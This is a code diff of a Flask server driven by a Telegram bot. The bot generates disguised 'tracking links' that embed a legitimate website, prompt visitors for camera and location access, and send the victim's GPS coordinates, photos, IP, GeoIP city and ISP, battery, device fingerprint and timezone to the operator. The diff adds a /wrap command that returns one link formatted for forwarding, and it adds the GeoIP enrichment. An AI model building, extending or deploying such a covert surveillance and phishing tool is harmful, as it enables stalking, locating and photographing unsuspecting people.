@@ -7,7 +7,6 @@ import requests
 from datetime import datetime
 from dotenv import load_dotenv
 from flask import Flask, request, send_from_directory, render_template, jsonify, url_for
-
 from urllib.parse import urlparse
 
 # load .env in development
@@ -44,11 +43,7 @@ def save_sessions(sessions):
 
 SESSIONS = load_sessions()
 
-# Simple in-memory chat state for Telegram conversations
-# Key: str(chat_id), Value: {"awaiting_url": bool}
-CHAT_STATE = {}
-
-# ---------- Small helpers ----------
+# ---------- Telegram helpers ----------
 def telegram_api(method: str, data=None, files=None, timeout=30):
     if not TELEGRAM_BOT_TOKEN:
         return None, "no_token"
@@ -83,6 +78,7 @@ def tg_send_photo(chat_id: str, photo_path: str, caption: str = None):
     except Exception:
         return False
 
+# ---------- Helpers ----------
 def is_valid_http_url(u: str):
     try:
         p = urlparse(u)
@@ -104,43 +100,12 @@ def normalize_url_for_wrap(text: str):
         return None
     return u
 
-def format_battery(bat):
-    if not bat:
-        return "unknown"
-    try:
-        level = bat.get("level")
-        charging = bat.get("charging")
-        if isinstance(level, (int, float)):
-            if level <= 1:
-                pct = round(level * 100)
-            else:
-                pct = round(level)
-            return f"{pct}%{' (charging)' if charging else ''}"
-        return str(bat)
-    except Exception:
-        return str(bat)
-
-def format_coords(coords):
-    if not coords:
-        return "unknown"
-    try:
-        lat = coords.get("lat")
-        lon = coords.get("lon")
-        acc = coords.get("acc") or coords.get("accuracy")
-        if lat is None or lon is None:
-            return str(coords)
-        if acc is not None:
-            return f"{lat},{lon} (±{acc} m)"
-        return f"{lat},{lon}"
-    except Exception:
-        return str(coords)
-
 # ---------- Endpoints ----------
 @app.route("/")
 def index():
     return ("Flask server for consented device session. Use the Telegram bot to create sessions.", 200)
 
-# Plain session creation (no embedded site) - kept for compatibility
+# Plain session creation (no embedded site)
 @app.route("/create", methods=["POST"])
 def create_session():
     data = request.get_json(silent=True) or {}
@@ -160,7 +125,7 @@ def create_session():
             chat_id,
             f"Plain session created\n"
             f"Token: {token}\n"
-            f"Link: {link}"
+            f"{link}"
         )
     return jsonify({"token": token, "link": link})
 
@@ -173,7 +138,7 @@ def session_page(token):
     except Exception:
         return f"Session page for {token}", 200
 
-# Wrapped session (site + tracker)
+# Wrapped session creation (embed a target URL)
 @app.route("/wrap_create", methods=["POST"])
 def wrap_create():
     data = request.get_json(silent=True) or {}
@@ -196,13 +161,8 @@ def wrap_create():
     save_sessions(SESSIONS)
     link = url_for("wrapper_page", token=token, _external=True)
     if chat_id:
-        # Keep this message very short and clean
-        tg_send_text(
-            chat_id,
-            "Wrapped session created\n"
-            f"Site: {target_url}\n"
-            f"Link: {link}"
-        )
+        # reply with only ONE link (clean for forwarding)
+        tg_send_text(chat_id, link)
     return jsonify({"token": token, "link": link})
 
 @app.route("/w/<token>")
@@ -213,9 +173,9 @@ def wrapper_page(token):
     try:
         return render_template("wrapper.html", token=token, target_url=target)
     except Exception:
-        return f"Wrapper page for {token} -> {target}", 200
+        return (f"Wrapper page for {token} -> {target}", 200)
 
-# Upload endpoints
+# ---------- upload_info with GeoIP and extra details ----------
 @app.route("/upload_info/<token>", methods=["POST"])
 def upload_info(token):
     if token not in SESSIONS:
@@ -224,10 +184,19 @@ def upload_info(token):
     payload = request.get_json(silent=True) or {}
     battery = payload.get("battery")
     coords = payload.get("coords")
-    details = payload.get("details")  # full extra data bundle
+    details = payload.get("details")  # full extra data bundle from JS
 
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr) or "unknown"
     timestamp = datetime.utcnow().isoformat()
+
+    # GeoIP enrichment (basic, external API)
+    geo = None
+    try:
+        resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=2)
+        if resp.ok:
+            geo = resp.json()
+    except Exception as e:
+        print("GeoIP lookup failed:", e)
 
     entry = {
         "timestamp": timestamp,
@@ -235,6 +204,7 @@ def upload_info(token):
         "battery": battery,
         "coords": coords,
         "details": details,
+        "geo": geo,
     }
 
     SESSIONS[token]["visits"].append(entry)
@@ -243,52 +213,138 @@ def upload_info(token):
     # -------- Telegram notification formatting --------
     chat_id = SESSIONS[token].get("chat_id")
     if chat_id:
-        # battery
-        if battery and isinstance(battery, dict):
-            bat_txt = f"{round(battery.get('level'))}%{' (charging)' if battery.get('charging') else ''}"
+        # Battery
+        if isinstance(battery, dict):
+            lvl = battery.get("level")
+            chg = battery.get("charging")
+            try:
+                if lvl is not None:
+                    lvl = round(float(lvl))
+                    bat_txt = f"{lvl}%{' (charging)' if chg else ''}"
+                else:
+                    bat_txt = "unknown"
+            except Exception:
+                bat_txt = str(battery)
         else:
             bat_txt = "unknown"
 
-        # coords
-        if coords and isinstance(coords, dict):
-            loc_txt = f"{coords.get('lat')},{coords.get('lon')} (±{coords.get('acc') or coords.get('accuracy','?')} m)"
+        # Coords
+        if isinstance(coords, dict):
+            lat = coords.get("lat")
+            lon = coords.get("lon")
+            acc = coords.get("acc") or coords.get("accuracy")
+            if lat is not None and lon is not None:
+                if acc is not None:
+                    loc_txt = f"{lat},{lon} (±{acc} m)"
+                else:
+                    loc_txt = f"{lat},{lon}"
+            else:
+                loc_txt = str(coords)
         else:
             loc_txt = "unknown"
 
-        # extra details
+        # GeoIP
+        city = region = country = isp = "unknown"
+        if isinstance(geo, dict):
+            city = geo.get("city") or "unknown"
+            region = geo.get("region") or geo.get("region_code") or "unknown"
+            country = geo.get("country_name") or geo.get("country") or "unknown"
+            isp = geo.get("org") or geo.get("asn") or "unknown"
+
+        # Extra device details from JS
         d = details or {}
-        ua = d.get("userAgent", "")
-        ram = d.get("ramGB")
+        ua = d.get("userAgent", "") or ""
+        platform = d.get("platform") or ""
         cpu = d.get("cpuCores")
+        ram = d.get("ramGB")
         scr = d.get("screen") or {}
         net = d.get("network") or {}
+        perms = d.get("permissions") or {}
+        tz = d.get("tz") or {}
 
-        msg = (
-            f"📡 Session {token} — INFO\n"
-            f"⏱ Time: {timestamp}\n"
-            f"🌍 IP: {ip}\n"
-            f"🔋 Battery: {bat_txt}\n"
-            f"📍 Location: {loc_txt}\n"
-            f"📱 Device: {ua[:80] + ('…' if len(ua) > 80 else '')}\n"
-            f"💾 RAM: {ram} GB   ⚙ CPU: {cpu} cores\n"
-            f"🖥 Screen: {scr.get('w')}×{scr.get('h')} ({scr.get('ratio')}x)\n"
-            f"📶 Network: {net.get('type','?')} {net.get('downlink','?')}Mbps"
-        )
+        ua_short = ua[:80] + ("…" if len(ua) > 80 else "")
+        os_browser = platform
+        if ua_short:
+            os_browser = f"{platform} | {ua_short}" if platform else ua_short
+
+        scr_w = scr.get("w")
+        scr_h = scr.get("h")
+        scr_ratio = scr.get("ratio")
+
+        net_type = net.get("type") or "?"
+        net_dl = net.get("downlink")
+        try:
+            if net_dl is not None:
+                net_dl = round(float(net_dl), 1)
+        except Exception:
+            pass
+
+        cam_perm = perms.get("camera")
+        geo_perm = perms.get("geolocation")
+
+        tz_name = tz.get("zone") if isinstance(tz, dict) else None
+        tz_off = tz.get("offset") if isinstance(tz, dict) else None
+
+        lines = [
+            f"📡 Session {token} — INFO",
+            f"⏱ Time: {timestamp}",
+            f"🌍 IP: {ip}",
+            f"🏙 GeoIP: {city}, {region}, {country}",
+            f"🏢 ISP: {isp}",
+            "",
+            f"🔋 Battery: {bat_txt}",
+            f"📍 GPS: {loc_txt}",
+        ]
+
+        device_line = f"📱 Device: {os_browser}" if os_browser else "📱 Device: unknown"
+        lines.append(device_line)
+
+        extra_hw = []
+        if ram is not None:
+            extra_hw.append(f"RAM {ram} GB")
+        if cpu is not None:
+            extra_hw.append(f"CPU {cpu} cores")
+        if extra_hw:
+            lines.append("💾 " + " · ".join(extra_hw))
+
+        if scr_w and scr_h:
+            scr_part = f"{scr_w}×{scr_h}"
+            if scr_ratio:
+                scr_part += f" ({scr_ratio}x)"
+            lines.append(f"🖥 Screen: {scr_part}")
+
+        net_parts = []
+        if net_type and net_type != "?":
+            net_parts.append(net_type.upper())
+        if net_dl is not None:
+            net_parts.append(f"{net_dl} Mbps")
+        if net_parts:
+            lines.append("📶 Network: " + " ".join(net_parts))
+
+        if tz_name or tz_off is not None:
+            tz_line = "🕒 Timezone: "
+            if tz_name:
+                tz_line += tz_name
+            if tz_off is not None:
+                tz_line += f" (offset {tz_off} min)"
+            lines.append(tz_line)
+
+        perm_bits = []
+        if cam_perm:
+            perm_bits.append(f"camera={cam_perm}")
+        if geo_perm:
+            perm_bits.append(f"geolocation={geo_perm}")
+        if perm_bits:
+            lines.append("✅ Permissions: " + ", ".join(perm_bits))
+
+        msg = "\n".join(lines)
         tg_send_text(chat_id, msg)
 
     return jsonify({"status": "ok", "stored": entry})
 
-
+# ---------- upload_image (unchanged except for cleaner caption) ----------
 @app.route("/upload_image/<token>", methods=["POST"])
 def upload_image(token):
-    """
-    Accepts JSON body:
-      {
-        "image_b64": "data:image/jpeg;base64,...",
-        "coords": {"lat":..., "lon":..., "accuracy" or "acc":...}  (optional),
-        "battery": {"level":..., "charging":...}                    (optional)
-      }
-    """
     if token not in SESSIONS:
         return "Invalid token", 404
 
@@ -296,7 +352,7 @@ def upload_image(token):
     b64 = data.get("image_b64", "")
     coords = data.get("coords")
     battery = data.get("battery")
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr) or "unknown"
 
     if not b64:
         return ("No image data", 400)
@@ -339,16 +395,40 @@ def upload_image(token):
 
     chat_id = sess.get("chat_id")
     if chat_id:
-        bat_txt = format_battery(battery)
-        coords_txt = format_coords(coords)
-        caption_lines = [
-            f"Session {token} (photo)",
-            f"Time: {timestamp}",
-            f"IP: {ip}",
-            f"Battery: {bat_txt}",
-            f"Coords: {coords_txt}",
-        ]
-        caption = "\n".join(caption_lines)
+        # short caption, IP + optional coords/battery
+        bat_txt = "unknown"
+        if isinstance(battery, dict):
+            lvl = battery.get("level")
+            chg = battery.get("charging")
+            try:
+                if lvl is not None:
+                    lvl = round(float(lvl))
+                    bat_txt = f"{lvl}%{' (charging)' if chg else ''}"
+            except Exception:
+                bat_txt = str(battery)
+
+        if isinstance(coords, dict):
+            lat = coords.get("lat")
+            lon = coords.get("lon")
+            acc = coords.get("acc") or coords.get("accuracy")
+            if lat is not None and lon is not None:
+                if acc is not None:
+                    loc_txt = f"{lat},{lon} (±{acc} m)"
+                else:
+                    loc_txt = f"{lat},{lon}"
+            else:
+                loc_txt = str(coords)
+        else:
+            loc_txt = "unknown"
+
+        caption = (
+            f"📷 Session {token} — PHOTO\n"
+            f"⏱ Time: {timestamp}\n"
+            f"🌍 IP: {ip}\n"
+            f"🔋 Battery: {bat_txt}\n"
+            f"📍 GPS: {loc_txt}"
+        )
+
         sent = tg_send_photo(chat_id, path, caption=caption)
         if not sent:
             try:
@@ -385,36 +465,22 @@ def telegram_webhook():
 
         chat = msg.get("chat", {})
         chat_id = chat.get("id")
-        chat_key = str(chat_id) if chat_id is not None else None
         text = (msg.get("text") or "").strip()
-        if not text or chat_key is None:
+        if not text or chat_id is None:
             return "ok", 200
 
-        state = CHAT_STATE.get(chat_key, {"awaiting_url": False})
-
-        # /cancel
-        if text.lower().startswith("/cancel"):
-            state["awaiting_url"] = False
-            CHAT_STATE[chat_key] = state
-            tg_send_text(chat_id, "Cancelled.\nUse /start to begin again.")
-            return "ok", 200
-
-        # /start -> ask for site
+        # /start: show help, no input waiting
         if text.lower().startswith("/start"):
-            state["awaiting_url"] = True
-            CHAT_STATE[chat_key] = state
             tg_send_text(
                 chat_id,
-                "Send the website you want to embed.\n"
-                "Examples:\n"
-                "  example.com\n"
-                "  https://unstop.com\n\n"
-                "I will reply with a single link that opens that site\n"
-                "and asks for camera/location in a popup."
+                "Commands:\n"
+                "/create [label]  – create plain session\n"
+                "/wrap <url>      – create embedded tracking link for a site\n"
+                "/status <token>  – show session summary"
             )
             return "ok", 200
 
-        # /create <label> (optional plain session)
+        # /create [label]
         if text.lower().startswith("/create"):
             parts = text.split(maxsplit=1)
             label = parts[1] if len(parts) > 1 else ""
@@ -426,17 +492,41 @@ def telegram_webhook():
                 )
                 if r.ok:
                     data = r.json()
-                    tg_send_text(
-                        chat_id,
-                        "Plain session created\n"
-                        f"Token: {data['token']}\n"
-                        f"Link: {data['link']}"
-                    )
+                    # already sends message from /create, but we can repeat link if we want
+                    tg_send_text(chat_id, data["link"])
                 else:
                     tg_send_text(chat_id, f"Failed to create session: {r.status_code}")
             except Exception as e:
                 print("create command error:", e)
                 tg_send_text(chat_id, "Server error while creating session.")
+            return "ok", 200
+
+        # /wrap <url>
+        if text.lower().startswith("/wrap"):
+            parts = text.split(maxsplit=1)
+            if len(parts) < 2:
+                tg_send_text(chat_id, "Usage: /wrap <url>\nExample: /wrap https://unstop.com")
+                return "ok", 200
+            raw = parts[1].strip()
+            url = normalize_url_for_wrap(raw)
+            if not url:
+                tg_send_text(chat_id, "Invalid URL. Include domain, e.g. https://example.com")
+                return "ok", 200
+            try:
+                r = requests.post(
+                    url_for("wrap_create", _external=True),
+                    json={"target_url": url, "label": "", "chat_id": str(chat_id)},
+                    timeout=5
+                )
+                if r.ok:
+                    data = r.json()
+                    # /wrap_create already sends the link; but repeat for clarity
+                    tg_send_text(chat_id, data["link"])
+                else:
+                    tg_send_text(chat_id, f"Failed to create wrapped session: {r.status_code}")
+            except Exception as e:
+                print("wrap command error:", e)
+                tg_send_text(chat_id, "Server error while creating wrapped session.")
             return "ok", 200
 
         # /status <token>
@@ -461,68 +551,56 @@ def telegram_webhook():
                 )
                 tg_send_text(chat_id, summary)
                 for v in visits[-5:]:
-                    bat_txt = format_battery(v.get("battery"))
-                    coords_txt = format_coords(v.get("coords"))
-                    ua = v.get("user_agent") or ""
-                    ua_short = (ua[:180] + "...") if len(ua) > 180 else ua
-                    lines = [
-                        f"Time: {v.get('timestamp')}",
-                        f"IP: {v.get('ip')}",
-                        f"Battery: {bat_txt}",
-                        f"Coords: {coords_txt}",
-                    ]
-                    if ua_short:
-                        lines.append(f"Device: {ua_short}")
-                    tg_send_text(chat_id, "\n".join(lines))
+                    bat = v.get("battery")
+                    if isinstance(bat, dict):
+                        lvl = bat.get("level")
+                        chg = bat.get("charging")
+                        try:
+                            if lvl is not None:
+                                lvl = round(float(lvl))
+                                bat_txt = f"{lvl}%{' (charging)' if chg else ''}"
+                            else:
+                                bat_txt = "unknown"
+                        except Exception:
+                            bat_txt = str(bat)
+                    else:
+                        bat_txt = "unknown"
+
+                    coords = v.get("coords")
+                    if isinstance(coords, dict):
+                        lat = coords.get("lat")
+                        lon = coords.get("lon")
+                        acc = coords.get("acc") or coords.get("accuracy")
+                        if lat is not None and lon is not None:
+                            if acc is not None:
+                                loc_txt = f"{lat},{lon} (±{acc} m)"
+                            else:
+                                loc_txt = f"{lat},{lon}"
+                        else:
+                            loc_txt = str(coords)
+                    else:
+                        loc_txt = "unknown"
+
+                    line = (
+                        f"Time: {v.get('timestamp')}\n"
+                        f"IP: {v.get('ip')}\n"
+                        f"Battery: {bat_txt}\n"
+                        f"GPS: {loc_txt}"
+                    )
+                    tg_send_text(chat_id, line)
             except Exception as e:
                 print("status command error:", e)
                 tg_send_text(chat_id, f"Failed to fetch status: {e}")
             return "ok", 200
 
-        # Awaiting a site URL after /start
-        if state.get("awaiting_url"):
-            candidate = text.strip()
-            url = normalize_url_for_wrap(candidate)
-            if not url:
-                tg_send_text(
-                    chat_id,
-                    "That doesn't look like a valid site.\n"
-                    "Send something like: example.com or https://example.com\n"
-                    "Or /cancel to stop."
-                )
-                return "ok", 200
-
-            try:
-                r = requests.post(
-                    url_for("wrap_create", _external=True),
-                    json={"target_url": url, "label": "", "chat_id": str(chat_id)},
-                    timeout=5
-                )
-                if r.ok:
-                    data = r.json()
-                    state["awaiting_url"] = False
-                    CHAT_STATE[chat_key] = state
-                    tg_send_text(
-                        chat_id,
-                        "Wrapped link ready\n"
-                        f"Site: {url}\n"
-                        f"Link: {data['link']}"
-                    )
-                else:
-                    tg_send_text(chat_id, f"Failed to create wrapped session: {r.status_code}")
-            except Exception as e:
-                print("wrap_create error:", e)
-                tg_send_text(chat_id, "Server error while creating wrapped session.")
-            return "ok", 200
-
         # Fallback
         tg_send_text(
             chat_id,
-            "Commands:\n"
-            "/start  – create embedded tracking link for a site\n"
-            "/status <token> – show session info\n"
-            "/create <label> – plain session (no site)\n"
-            "/cancel – cancel current flow"
+            "Unknown command.\n"
+            "Use:\n"
+            "/create [label]\n"
+            "/wrap <url>\n"
+            "/status <token>"
         )
         return "ok", 200
 
@@ -533,6 +611,6 @@ def telegram_webhook():
 
 # ---------- Run ----------
 if __name__ == "__main__":
-  debug_mode = os.environ.get("FLASK_DEBUG", "0") in ("1", "true", "True")
-  port = int(os.environ.get("PORT", 5000))
-  app.run(host="0.0.0.0", port=port, debug=debug_mode)
+    debug_mode = os.environ.get("FLASK_DEBUG", "0") in ("1", "true", "True")
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port, debug=debug_mode)
